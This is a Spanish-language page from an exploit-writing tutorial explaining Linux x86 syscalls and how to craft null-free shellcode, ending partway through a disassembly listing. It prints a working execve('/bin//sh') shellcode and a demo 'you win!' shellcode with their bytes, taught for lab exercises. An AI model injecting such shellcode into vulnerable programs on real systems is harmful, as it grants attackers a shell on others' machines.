<!DOCTYPE html>
<html lang="en-us">

  <head>
  <link href="http://gmpg.org/xfn/11" rel="profile">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">

  <!-- Enable responsiveness on mobile devices-->
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

  <title>
    
       &middot; Guía de exploits
    
  </title>

  <!-- CSS -->

  <link rel="stylesheet" href="/guia-escritura-exploits/public/css/poole.css">
  <link rel="stylesheet" href="/guia-escritura-exploits/public/css/syntax.css">
  <link rel="stylesheet" href="/guia-escritura-exploits/public/css/hyde.css">
  <link rel="stylesheet" href="http://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">

  <!-- Icons -->
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/guia-escritura-exploits/public/apple-touch-icon-144-precomposed.png">
                                 <link rel="shortcut icon" href="/guia-escritura-exploits/public/favicon.ico">

  <!-- RSS -->
  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">
</head>


  <body>

    <div class="sidebar">
 <!-- <div class="container sidebar-sticky">-->
  <div class="container sidebar">
    <div class="sidebar-about">
      <h1>
        <a href="/guia-escritura-exploits/">
          Guía de exploits
        </a>
      </h1>
      <!--<p class="lead"></p>-->
    </div>

    <nav class="sidebar-nav">

     <!-- <a class="sidebar-nav-item" href="/guia-escritura-exploits/">Home</a>-->

        <a class="sidebar-nav-item" href="/guia-escritura-exploits/buffer-overflow/index.html">Buffer Overflow</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/1-introduccion.html">Nivel 1 | Teoría</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/1-practica.html">Nivel 1 | Práctica</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/2-shellcode.html">Nivel 2 | Shellcode</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/2-practica.html">Nivel 2 | Práctica</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/3-got.html">Nivel 3 | GOT</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/3-practica.html">Nivel 3 | Práctica</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/4-practica.html">Nivel 4 | Práctica</a>

        <a class="sidebar-nav-item" href="/guia-escritura-exploits/format-string/index.html">Format String</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/format-string/5-format-string.html">Nivel 5 | Format strings</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/format-string/5-practica.html">Nivel 5 | Práctica</a>

        <a class="sidebar-nav-item" href="/guia-escritura-exploits/esoteric/index.html">Esoteric</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/esoteric/6-ret2libc.html">Nivel 6 | Return to libc</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/esoteric/6-practica.html">Nivel 6 | Práctica</a>

        <a class="sidebar-nav-item" href="/guia-escritura-exploits/configuracion.html">Configuración</a>
        <a class="sidebar-nav-item" href="/guia-escritura-exploits/herramientas.html">Herramientas</a>


      <!--<a class="sidebar-nav-item" href="/archive/v2.1.0.zip">Descargar PDF</a>-->
      <a class="sidebar-nav-item" href="https://github.com/fundacion-sadosky/guia-escritura-exploits">Proyecto en GitHub</a>
    </nav>

    <p class="sidebar-nav-item footer">Basado en los <a href="https://github.com/gerasdf/InsecureProgramming/">abos de Gera</a></br> Teresa Alberto | STIC, Fundación Sadosky  </br> <a href="https://github.com/fundacion-sadosky/guia-escritura-exploits/blob/master/LICENSE">GNU GPL</a> | 2018</p>
  </div>
</div>


    <div class="content container">
      <div class="page">
  <!--<h1 class="page-title"></h1>-->
  <h1 id="shellcode--syscalls">Shellcode &amp; syscalls</h1>
<p>En los ataques iniciales presentados en esta guía el objetivo es aprovecharse de la vulnerabilidad de un programa para que ejecute código malicioso que no estaba en el binario original. En otras palabras, lo que se busca ejecutar es un shellcode.</p>

<p>Un shellcode es un código que se inyecta en la memoria de un programa vulnerable bajo la forma de un string de bytes.   <br />
El nombre <em>shellcode</em> se refería históricamente a inyectar un programa shell que permite ejecutar cualquier otro comando, no obstante hoy el término se usa de manera general para hablar de la inyección de código malicioso. Es posible programar un shellcode para que haga cualquier cosa que se nos ocurra dado que en última instancia es en sí mismo un programa.</p>

<p>Un programa en C que utiliza funciones como <code class="highlighter-rouge">printf()</code> o <code class="highlighter-rouge">write()</code> de la biblioteca <code class="highlighter-rouge">libc</code>, usa esta biblioteca para realizar llamadas al sistema operativo que es el encargado de manejar cuestiones como la escritura, lectura y ejecución de programas. 
Hay que tener en cuenta que el shellcode no se va a cargar en memoria por el sistema operativo, sino que directamente es copiado a la memoria del programa vulnerable como una cadena de caracteres, aprovechando funciones como <code class="highlighter-rouge">strcpy()</code> y <code class="highlighter-rouge">gets()</code>.</p>

<p>Es por ello que, si nuestro shellcode utiliza alguna de esas funciones (lo más probable es que necesitemos que lo haga) esas llamadas al sistema operativo deben ser manejadas directamente. Es necesario entonces comprender el funcionamiento de las syscalls antes de continuar con la creación de un shellcode en sí mismo.</p>

<h2 id="llamadas-al-sistema">Llamadas al sistema</h2>
<p>A la hora de planear estrategias de ataque se usarán frecuentemente llamadas al sistema.    <br />
Los programas que corren en el espacio de usuario cuando requieren interactuar con el sistema operativo deben realizar <em>llamadas al sistema</em> para que el sistema operativo realice las operaciones en su nombre.
La manera en que se hace esta llamada es diferente para cada arquitectura, en el caso de x86 los programas de usuario pueden hacer una llamada al sistema con una interrupción por software con la instrucción <code class="highlighter-rouge">int 0x80</code>.</p>

<p>En Linux cada llamada toma sus argumentos de los registros según el siguiente criterio:</p>
<pre><code class="language-asm">eax =&gt; nro de syscall
ebx =&gt; 1er argumento
ecx =&gt; 2do argumento
edx =&gt; 3er argumento 
</code></pre>
<p>Para saber el número que corresponde a cada syscall se puede consultar: <code class="highlighter-rouge">/usr/include/asm/unistd_32.h</code>.   <br />
Según la syscall en cuestión será necesario definir también los valores de otros registros.</p>

<p>Con <code class="highlighter-rouge">strace</code> es posible rastrear las llamadas a sistema que suceden cuando tenemos un programa en C tan simple como:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">test</span><span class="o">-</span><span class="n">syscalls</span><span class="p">.</span><span class="n">c</span>

    <span class="cp">#include &lt;stdio.h&gt;
</span>    <span class="kt">int</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
    	<span class="n">printf</span><span class="p">(</span><span class="s">"Hola mundo!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    user@abos:~<span class="nv">$ </span>gcc <span class="nt">-m32</span> <span class="nt">-o</span> test-syscalls test-syscalls.c
    user@abos:~<span class="nv">$ </span>strace ./test-syscalls
    execve<span class="o">(</span><span class="s2">"./llamada-sistema"</span>, <span class="o">[</span><span class="s2">"./llamada-sistema"</span><span class="o">]</span>, <span class="o">[</span>/<span class="k">*</span> 18 vars <span class="k">*</span>/]<span class="o">)</span> <span class="o">=</span> 0
    brk<span class="o">(</span>0<span class="o">)</span>                                  <span class="o">=</span> 0x804a000
    ....
    fstat64<span class="o">(</span>1, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFCHR|0620, <span class="nv">st_rdev</span><span class="o">=</span>makedev<span class="o">(</span>136, 2<span class="o">)</span>, ...<span class="o">})</span> <span class="o">=</span> 0
    mmap2<span class="o">(</span>NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, <span class="nt">-1</span>, 0<span class="o">)</span> <span class="o">=</span> 0xb7fd8000
    
 <span class="o">=&gt;</span> write<span class="o">(</span>1, <span class="s2">"Hola mundo!</span><span class="se">\n</span><span class="s2">"</span>, 12<span class="o">)</span>           <span class="o">=</span> 12

    exit_group<span class="o">(</span>0<span class="o">)</span>                           <span class="o">=</span> ?
    +++ exited with 0 +++
</code></pre></div></div>
<p>Entre otras es posible rastrear la llamada al systema <code class="highlighter-rouge">write</code> que es la encargada de efectivamente imprimir el string.</p>

<h3 id="syscall-write">Syscall write:</h3>
<p>Para imprimir por <code class="highlighter-rouge">stdout</code> es necesaria la syscall <code class="highlighter-rouge">write</code>.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nv">$ </span>man 2 write          <span class="p">;</span> documentación de syscalls

 WRITE<span class="o">(</span>2<span class="o">)</span>
 SYNOPSIS
     <span class="c">#include &lt;unistd.h&gt;</span>
     ssize_t write<span class="o">(</span>int fd, const void <span class="k">*</span>buf, size_t count<span class="o">)</span><span class="p">;</span>
</code></pre></div></div>
<p>Con los registros seteados de la siguiente manera:</p>
<pre><code class="language-asm">eax =&gt; nro 4 syscall write
ebx =&gt; 1er argumento: fd o file descriptor. Es 1 para stdout.
ecx =&gt; 2do argumento: *buf o mensaje a imprimir.
edx =&gt; 3er argumento: count o longitud del mensaje.  
</code></pre>

<p>Ejemplo de una syscall <code class="highlighter-rouge">write</code> en assembler:</p>
<pre><code class="language-asm">section .data                  ; segmento DATA
  mensaje db "Hola mundo", 0x0a

section .text                  ; segmento TEXT
  global _start                ; punto de entrada del ELF

  _start:

  ; syscall write(1, mensaje, 11)
    mov eax, 4                 ; 4 = write, nro syscall
    mov ebx, 1                 ; 1 = stdout, filedescriptor
    mov ecx, mensaje           ; mensaje en ecx 
    mov edx, 11                ; longitud del mensaje (Hola mundo\n)
    int 0x80                   ; interrupcion de llamado al sistema
</code></pre>

<h3 id="syscall-exit">Syscall exit:</h3>
<p>Para finalizar un proceso se usa el syscall exit:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nv">$ </span>man 2 <span class="nb">exit

 </span>EXIT<span class="o">(</span>2<span class="o">)</span>
 SYNOPSIS
       <span class="c">#include &lt;unistd.h&gt;</span>
       void _exit<span class="o">(</span>int status<span class="o">)</span><span class="p">;</span>
</code></pre></div></div>
<p>Los registros deben estar seteados de la siguiente manera:</p>
<pre><code class="language-asm">eax =&gt; nro 1 syscall exit
ebx =&gt; 1er argumento: status.   
</code></pre>
<p>Si quisieramos ejecutar <code class="highlighter-rouge">exit(0)</code>, el código assembler necesario sería:</p>
<pre><code class="language-asm">section .text                  ; segmento TEXT
  global _start                  ; punto de entrada del ELF

  _start:

  ; syscall exit(0)
    xor    ebx,ebx              ; ebx = 0, status code
    xor    eax,eax
    mov    al,0x1               ; 1 = exit, nro syscall
    int    0x80
</code></pre>

<h3 id="syscall-execve">Syscall execve:</h3>
<p>Para ejecutar un programa se usa el syscall execve, que corresponde al syscall 11.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nv">$ </span>man 2 execve

 EXECVE<span class="o">(</span>2<span class="o">)</span>
 SYNOPSIS
     <span class="c">#include &lt;unistd.h&gt;</span>
     int execve<span class="o">(</span>const char <span class="k">*</span>filename, char <span class="k">*</span>const argv[], char <span class="k">*</span>const envp[]<span class="o">)</span><span class="p">;</span>
</code></pre></div></div>
<p>Para ejecutar <code class="highlighter-rouge">execve</code> los registros deben estar seteados de la siguiente manera:</p>
<pre><code class="language-asm">eax =&gt; nro 11 syscall execve
ebx =&gt; 1er argumento: filename, un puntero al nombre del binario a ejecutar. 
ecx =&gt; 2do argumento: argv[], un puntero a un array de argumentos (comenzando por el nombre del binario y finalizando con un caracter nulo).
edx =&gt; 3er argumento: envp[], un puntero a un array de variables de entorno, que también finaliza en un caracter nulo.  
</code></pre>
<p>Para simplificar el código en assembler, buscamos ejecutar <code class="highlighter-rouge">execve("/bin/sh", NULL, NULL)</code> (con <code class="highlighter-rouge">argv[]</code> y <code class="highlighter-rouge">envp[]</code> en <code class="highlighter-rouge">NULL</code>). Para ello los registros deben estar seteados de la siguiente manera:</p>
<pre><code class="language-asm">eax =&gt; nro 11 syscall execve
ebx =&gt; 1er argumento: puntero al string /bin/sh.
ecx =&gt; 2do argumento: NULL
edx =&gt; 3er argumento: NULL
</code></pre>
<p>Y el código en assembler sería:</p>
<pre><code class="language-asm"> 31 c0            xor    eax,eax
 50               push   eax           ; \0
 68 2f 2f 73 68   push   0x68732f2f    ; hs// en ASCII (little endian de //sh)
 68 2f 62 69 6e   push   0x6e69622f    ; nib/ en ASCII (little endian de /bin)
 89 e3            mov    ebx, esp      ; ebx =&gt; /bin//sh\0
 89 c1            mov    ecx, eax      ; ecx = 0x0
 89 c2            mov    edx, eax      ; edx = 0x0
 b0 0b            mov    al, 0x0b      ; 11 = execve, nro syscall
 cd 80            int    0x80
</code></pre>
<p>Ejemplo tomado de <a href="http://shell-storm.org/shellcode/files/shellcode-811.php">Shell storm</a>.</p>

<blockquote>
  <p><strong>Consideraciones</strong>: el uso de una doble barra de <code class="highlighter-rouge">/bin//sh</code> es por el problema de la escritura de caracteres nulos en el shellcode. La barra extra permite alinear el string <code class="highlighter-rouge">/bin//sh</code> en dos <a href="/guia-escritura-exploits/buffer-overflow/imagenes/stack1/tipo-dato.png">double-words</a> (de 4 bytes cada una), quedando el <code class="highlighter-rouge">\0</code> final en la siguiente word o <em>palabra</em>. Este alineamiento permite generar ese <code class="highlighter-rouge">\0</code> final con un <code class="highlighter-rouge">xor</code>, sin tener el problema de la escritura de caracteres nulos. Si en cambio se elimina la doble barra, el <code class="highlighter-rouge">\0</code> formaría parte de la segunda double-word y con un <code class="highlighter-rouge">xor</code> no lograríamos incluirlo en el string y un mecanismo más complejo sería necesario. La cuestión de los caracteres especiales en el shellcode se desarrolla más adelante.</p>
</blockquote>

<h3 id="ensamblar-y-linkear">Ensamblar y linkear</h3>
<p>Cuando compilamos un programa en C, <a href="/guia-escritura-exploits/herramientas.md#gcc"><code class="highlighter-rouge">gcc</code></a> se ocupa de ensamblar el programa y linkearlo para lograr el archivo ELF ejecutable. De manera similar cuando partimos de un programa en assembler y queremos obtener un archivo ELF ejecutable podemos ensamblar el programa con <code class="highlighter-rouge">nasm -f ELF</code> y linkearlo con <code class="highlighter-rouge">ld</code>.   <br />
Para indicarle al linker dónde comienzan las instrucciones en assembler se agrega la línea <code class="highlighter-rouge">global _start</code>.</p>

<p>Creamos un programa <code class="highlighter-rouge">holaMundo.asm</code> en assembler con las llamadas <code class="highlighter-rouge">write()</code> y <code class="highlighter-rouge">exit()</code>:</p>
<pre><code class="language-asm">section .data                  ; segmento DATA
mensaje db "Hola mundo", 0x0a

section .text                  ; segmento TEXT
global _start                  ; punto de entrada del ELF

_start:

;syscall write(1, mensaje, 11)
        mov eax, 4                 ; syscall write: #4
        mov ebx, 1                 ; stdout filedescriptor: #1
        mov ecx, mensaje           ; mensaje en ecx
        mov edx, 11                ; longitud del mensaje (Hola mundo\n)
        int 0x80                   ; interrupcion

;syscall exit(0)
        mov eax, 1
        mov ebx, 0
        int 0x80
</code></pre>
<blockquote>
  <p><strong>Consideraciones</strong>: es importante tener en mente que el string se almacenó en la sección .data. En el siguiente apartado se retomará este punto para plantear una estrategia alternativa.</p>
</blockquote>

<p>Lo ensamblamos:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@abos:~<span class="nv">$ </span>nasm <span class="nt">-f</span> elf holaMundo.asm
</code></pre></div></div>
<p><code class="highlighter-rouge">nasm</code> con el argumento <code class="highlighter-rouge">-f elf</code> ensambla el programa en un archivo objeto preparado para ser linkeado como un binario ELF. Como resultado genera el archivo objeto <code class="highlighter-rouge">holaMundo.o</code>.   <br />
Linkeamos ese archivo objeto:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@abos:~<span class="nv">$ </span>ld <span class="nt">-o</span> holaMundo holaMundo.o
</code></pre></div></div>
<p><code class="highlighter-rouge">ld</code> va a crear un binario ELF a partir del archivo objeto.   <br />
Ejecutamos y vemos la salida estándar y la finalización del programa:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@abos:~<span class="nv">$ </span>./holaMundo
Hola mundo
</code></pre></div></div>

<h2 id="shellcode">Shellcode</h2>
<p>Existen 3 instancias importantes: la programación del shellcode, su inyección en memoria como string de bytes y su ejecución.</p>

<p>El shellcode no es un programa ejecutable como cualquier otro, sus instrucciones deben ser autocontenidas para lograr su ejecución por parte del procesador sin importar el estado actual del programa vulnerable. El shellcode no va a ser linkeado ni va a ser cargado en memoria como un proceso por el sistema operativo. Es por ello que los ejemplos de llamadas al sistema deben ser retocados para cumplir ciertos criterios:</p>
<ol>
  <li><strong>No disponemos del segmento data</strong>: no es posible utilizar el segmento de datos en el código assembler del shellcode como se hizo con “Hola mundo” en el ejemplo anterior <code class="highlighter-rouge">holaMundo.asm</code>. El shellcode no se ejecutará como un programa corriente ni sus segmentos serán cargados en memoria por el sistema operativo. Es por ello que veremos maneras de manipular un string sin recurrir a la sección .data.</li>
  <li><strong>Evitar caracteres especiales</strong>: el shellcode no debe tener caracteres especiales como <code class="highlighter-rouge">\x00</code> entre sus bytes porque se copia en memoria con funciones que manipulan strings como <code class="highlighter-rouge">strcpy()</code>. Usarlos provocaria que el shellcode quede truncado. (Es posible por prueba y error detectar qué caracter finaliza el copiado del shellcode en memoria, según la función vulnerable de la que se trate).</li>
  <li><strong>Mínima longitud</strong>: el shellcode debe tener la mínima longitud posible porque en la mayoría de los casos no contamos con demasiado espacio para almacenarlo.</li>
</ol>

<h3 id="programar-un-shellcode">Programar un shellcode</h3>
<p>Es recomendable comenzar programando unx mismx los shellcodes más sencillos para comprender su funcionamiento y acercarse a la potencia de crear shellcodes ad-hoc. No obstante existen repositorios de shellcodes a disposición en <a href="http://shell-storm.org/shellcode/">Shell storm</a> o <a href="https://www.exploit-db.com/shellcode/">exploit-db</a>. Es importante manipular estos binarios con extrema precaución, por ejemplo trabajando con un entorno virtualizado como buena práctica.</p>

<h4 id="estrategias-para-crear-un-shellcode-inyectable-dentro-de-un-programa-vulnerable">Estrategias para crear un shellcode inyectable dentro de un programa vulnerable:</h4>
<p>Suponiendo que queremos con nuestro shellcode imprimir un mensaje por salida estándar, similar al siguiente programa en C:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;unistd.h&gt;
</span> 
<span class="kt">int</span> <span class="n">main</span><span class="p">(){</span>
	<span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="err">“</span><span class="n">you</span> <span class="n">win</span><span class="o">!</span><span class="err">”</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Seguimos la directivas indicadas anteriormente.</p>

<ol>
  <li>
    <p><strong>No disponemos del segmento data</strong>: el string “you win” debe ser almacenado en la pila directamente para evitar el uso del segmento de datos. Al hacerlo de esa manera necesitamos un puntero al string para pasarle como argumento a <code class="highlighter-rouge">write()</code> y lograr que se imprima ese mensaje, ya que no conocemos de antemano su dirección exacta.</p>

    <p>Para contar con la dirección del string podemos aprovechar que la instrucción <code class="highlighter-rouge">call</code> en assembler se encarga de almacenar en la pila la dirección que sigue al <code class="highlighter-rouge">call</code> antes de hacer el salto a la función llamada y de esta manera poder retornar una vez finalizada su ejecución. Agregamos un <code class="highlighter-rouge">call</code> ad-hoc seguido del string que sólo sirva para almacenar su dirección en un lugar conocido de la pila.</p>

    <p><code class="highlighter-rouge">shellcode.asm</code></p>

    <pre><code class="language-asm">      section .text
        global _start
 
       _start:
 +---&lt;   jmp short dummy        ; 1. salto a un dummy con el call
 | 
 |  -&gt; imprimir_str:            ; 3. syscall write()
 |  |  pop ecx                  ; desapilo la dirección del string en ecx
 |  |  ....
 |  |
 |  | 
 +-&gt;|  dummy:                   
    +--&lt; call imprimir_str      ; 2. llamo al código encargado de imprimir el mensaje
         db 'you win!A'         ; antes de saltar apila dirección de "you win!A"
                                ; para retornar luego del call
</code></pre>

    <p>Una vez almacenada la dirección del string, con la instrucción <code class="highlighter-rouge">pop</code> lo almacenamos en un registro para su uso posterior.</p>
  </li>
  <li>
    <p><strong>Evitar caracteres especiales</strong>: se usan ciertos trucos para que al compilar el código binario no tenga caracteres nulos.</p>
    <ul>
      <li>En las llamadas a sistema es frecuente tener que poner en cero un registro (por ejemplo para el status del syscall <code class="highlighter-rouge">exit</code>). Si en vez de copiar un cero usamos un OR exclusivo (un XOR de un valor con sí mismo siempre da cero) logramos el objetivo sin valores nulos en el código máquina.
        <pre><code class="language-asm">instrucción      | código máquina
mov eax, 0         \xb8\x00\x00\x00\x00     ; eax = 0. Pero con valores nulos en código máquina.
xor eax, eax       \x31\xc0                 ; eax = 0. Sin valores nulos.
</code></pre>
      </li>
      <li>Cuando una instrucción manipula un registro de 32 bits (como <code class="highlighter-rouge">eax</code>) y el otro de sus operandos ocupa menos bits (por ejemplo un entero como el número 2) se completa con ceros, es decir 2 pasa a ser <code class="highlighter-rouge">0000 0002</code> y almacenado bajo el formato little endian <code class="highlighter-rouge">\x02\x00\x00\x00</code> como se puede ver en el código máquina de abajo. Para evitar los caracteres nulos finales es posible usar únicamente las <a href="/guia-escritura-exploits/buffer-overflow/imagenes/partes-registro.png">partes del registro</a> necesarias para la operación (por ejemplo, con <code class="highlighter-rouge">al</code> se manipulan sólo los 8 bits menos significativos del registro).
        <pre><code class="language-asm">instrucción      | código máquina
mov eax, 2         \xb8\x02\x00\x00\x00     ; eax = 00 00 00 02
mov ax, 2          \x66\xb0\x02\x00         ; eax = ?? ?? 00 02
mov al, 2          \xb0\x02                 ; eax = ?? ?? ?? 02. Sin caracteres nulos en cód. maquina
</code></pre>
        <p>Al hacer esto, el resto de los bits de <code class="highlighter-rouge">eax</code> tienen datos desconocidos, lo que puede provocar un funcionamiento inesperado. Por eso es importante antes de estas operaciones poner en 0 el registro.</p>
        <pre><code class="language-asm"> instrucción      | código máquina
 xor eax, eax       \x31\xc0                 ; eax = 00 00 00 00
 mov al, 2          \xb0\x02                 ; eax = 00 00 00 02
</code></pre>
        <p>Finalmente, para poner en cero el registro el código máquina resultante <code class="highlighter-rouge">\x31\xc0\xb0\x02</code> no tiene caracteres nulos.</p>
      </li>
      <li>¿Cómo finalizar el string a imprimir sin usar un caracter especial que trunque el shellcode (como el caracter nulo <code class="highlighter-rouge">\0</code>, nueva línea <code class="highlighter-rouge">\x0a</code> y <em>retorno de carro</em> <code class="highlighter-rouge">\x0d</code>)?    <br />
En estos casos usamos un caracter cualquiera para finalizar el string (por ejemplo la letra <code class="highlighter-rouge">A</code>) y después reemplazamos su valor por <code class="highlighter-rouge">\0</code>.
        <pre><code class="language-asm">     section .text
      global _start

      _start:
+---&lt;   jmp short dummy        ; 1. salto a un dummy con el call
| 
|  -&gt; imprimir_str:            ; 3. syscall write()
|  |  pop ecx                  ; ecx =&gt; 'you win!A'
|  |  xor eax, eax
|  |  mov [ecx+8], al          ; ecx =&gt; 'you win!\0'
|  |  ....
|  | 
--&gt;|  dummy:                   
   +--&lt; call imprimir_str      ; 2. llamo al código encargado de imprimir el mensaje
        db 'you win!A'         ; antes de saltar apila dirección de "you win!A"
                               ; para retornar luego del call
</code></pre>

        <p>Como resultado final tenemos en <code class="highlighter-rouge">ecx</code> la dirección del string <code class="highlighter-rouge">you win!\0</code>.</p>
      </li>
    </ul>
  </li>
</ol>

<blockquote>
  <p><strong>Consideraciones</strong></p>
  <ul>
    <li><strong>db</strong>: es la directiva <em>define byte</em> que permite reservar espacio en memoria para un string, como en <code class="highlighter-rouge">db 'you win!A'</code>.</li>
  </ul>
</blockquote>

<ol>
  <li><strong>Mínima longitud</strong>: en muchos casos dos instrucciones en assembler cumplen el mismo objetivo pero una de ellas consume menos bytes. Hay que estar atentxs para optar siempre por la opción menos costosa en espacio.   <br />
Por ejemplo si un syscall obliga a poner en 1 un registro, existen dos maneras:
    <pre><code class="language-asm">instrucción      | código máquina
xor ebx, ebx       \x31\xdb                 ; ebx = 00 00 00 00
mov bl, 1          \xb3\x01                 ; ebx = 00 00 00 01
</code></pre>
    <pre><code class="language-asm">instrucción      | código máquina
xor ebx, ebx       \x31\xdb                 ; ebx = 00 00 00 00
inc ebx            \x43                     ; ebx = 00 00 00 01
</code></pre>
    <p>¡Usando <code class="highlighter-rouge">inc</code> en vez de <code class="highlighter-rouge">mov</code> ahorramos 8 bits! Parece poco pero es clave cuando almacenamos un shellcode en espacios de memoria reducidos.</p>
  </li>
</ol>

<h4 id="shellcode-que-imprime-you-win">Shellcode que imprime “you win!”</h4>
<ol>
  <li>Código en assembler:
<code class="highlighter-rouge">shellcode.asm</code>
    <pre><code class="language-asm">        section .text
         global _start
         _start:
   +---&lt;   jmp short dummy        ; 1.
   | 
   |  -&gt; imprimir_str:            ; 3.
   |  |    xor eax,eax            ; eax = 0
   |  |    pop ecx                ; ecx =&gt; "you win!A"
   |  |    mov [ecx+8],al         ; ecx =&gt; "you win!\0"
   |  |    mov al,4               ; syscall write: #4
   |  |    xor ebx,ebx            ; ebx = 0
   |  |    inc ebx                ; stdout filedescriptor: #1
   |  |    xor edx,edx            ; edx = 0
   |  |    mov dl,9               ; longitud "you win!\0": 9
   |  |    int 0x80               ; write(1, string, 9)
   |  |    
   |  |    mov al,1               ; syscall exit: #1
   |  |    dec ebx                ; ebx = 0
   |  |    int 0x80               ; exit(0)
   |  |
   --&gt;|  dummy:                   ; 2.
      +--&lt; call imprimir_str      ; apilo addr "you win!A"
           db 'you win!A'
</code></pre>
  </li>
  <li>
    <p>Shellcode como string<br />
Existen varias maneras de obtener el código de máquina como cadena de caracteres a partir del código assembler. Con herramientas como <a href="https://defuse.ca/online-x86-assembler.htm#disassembly">Online x86 de Defuse</a> o con <a href="https://docs.pwntools.com/en/stable/intro.html#assembly-and-disassembly">pwntools</a> para trabajar en python.   <br />
Otra manera simple de obtenerlo es usando <code class="highlighter-rouge">hexdump</code> desde la consola.</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@abos:~<span class="nv">$ </span>nasm <span class="nt">-f</span> elf shellcode.asm                               <span class="p">;</span> ensamblamos
user@abos:~<span class="nv">$ </span>ld <span class="nt">-N</span> shellcode.o <span class="nt">-o</span> shellcode                          <span class="p">;</span> linkeamos
user@abos:~<span class="nv">$ </span>objcopy <span class="nt">-j</span> .text <span class="nt">-O</span> binary shellcode.o shellcode.bin    <span class="p">;</span> extraemos section .text 
user@abos:~<span class="nv">$ </span>hexdump <span class="nt">-v</span> <span class="nt">-e</span> <span class="s1">'"\\" 1/1 "x%02x"'</span> shellcode.bin<span class="p">;</span> <span class="nb">echo</span>    <span class="p">;</span> extraemos byte code de binario
<span class="se">\x</span>eb<span class="se">\x</span>16<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>59<span class="se">\x</span>88<span class="se">\x</span>41<span class="se">\x</span>08<span class="se">\x</span>b0<span class="se">\x</span>04<span class="se">\x</span>31<span class="se">\x</span>db<span class="se">\x</span>43<span class="se">\x</span>31<span class="se">\x</span>d2<span class="se">\x</span>b2<span class="se">\x</span>09<span class="se">\x</span><span class="nb">cd</span><span class="se">\x</span>80<span class="se">\x</span>b0<span class="se">\x</span>01<span class="se">\x</span>4b<span class="se">\x</span><span class="nb">cd</span><span class="se">\x</span>80<span class="se">\x</span>e8<span class="se">\x</span>e5<span class="se">\x</span>ff<span class="se">\x</span>ff<span class="se">\x</span>ff<span class="se">\x</span>79<span class="se">\x</span>6f<span class="se">\x</span>75<span class="se">\x</span>20<span class="se">\x</span>77<span class="se">\x</span>69<span class="se">\x</span>6e<span class="se">\x</span>21<span class="se">\x</span>41
</code></pre></div>    </div>

    <p>Y el código de máquina obtenido debe coincidir con el código de máquina mostrado en la segunda columna al desensamblar con <code class="highlighter-rouge">objdump</code>:</p>
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@abos:~<span class="nv">$ </span>objdump <span class="nt">-d</span> <span class="nt">-M</span> intel shellcode                     
shellcode:     file format elf32-i386

Disassembly of section .text:
   
08048060 &lt;_start&gt;:
 8048060: eb 16                 jmp    8048078 &lt;dummy&gt;
   
08048062 &lt;imprimir_str&gt;:
 8048062: 31 c0                 xor    eax,eax
 8048064: 59                    pop    ecx
 8048065: 88 41 08              mov    BYTE PTR <span class="o">[</span>ecx+0x8],al
 8048068: b0 04                 mov    al,0x4
 804806a: 31 db                 xor    ebx,ebx
 804806c: 43                    inc    ebx
 804806d: 31 d2                 xor    edx,edx
 804806f: b2 09                 mov    dl,0x9
 8048071: <span class="nb">cd </span>80                 int    0x80
 8048073: b0 01                 mov    al,0x1
 8048075: 4b                    dec    ebx
 8048076: <span class="nb">cd </span>80                 int    0x80
   
08048078 &lt;dummy&gt;:
 8048078: e8 e5 ff ff ff        call   8048062 &lt;imprimir_str&gt;
 804807d: 79 6f                 jns    80480ee &lt;_end+0x66&gt;   <span class="p">;</span> <span class="se">\x</span>79<span class="se">\x</span>6f <span class="o">=</span> <span class="s2">"yo"</span>
 804807f: 75 20                 jne    80480a1 &lt;_end+0x19&gt;   <span class="p">;</span> <span class="se">\x</span>75<span class="se">\x</span>20 <span class="o">=</span> <span class="s2">"u "</span>
 8048081: 77 69                 ja     80480ec &lt;_end+0x64&gt;   <span class="p">;</span> <span class="se">\x</span>77<span class="se">\x</span>69 <span class="o">=</span> <span class="s2">"wi"</span>
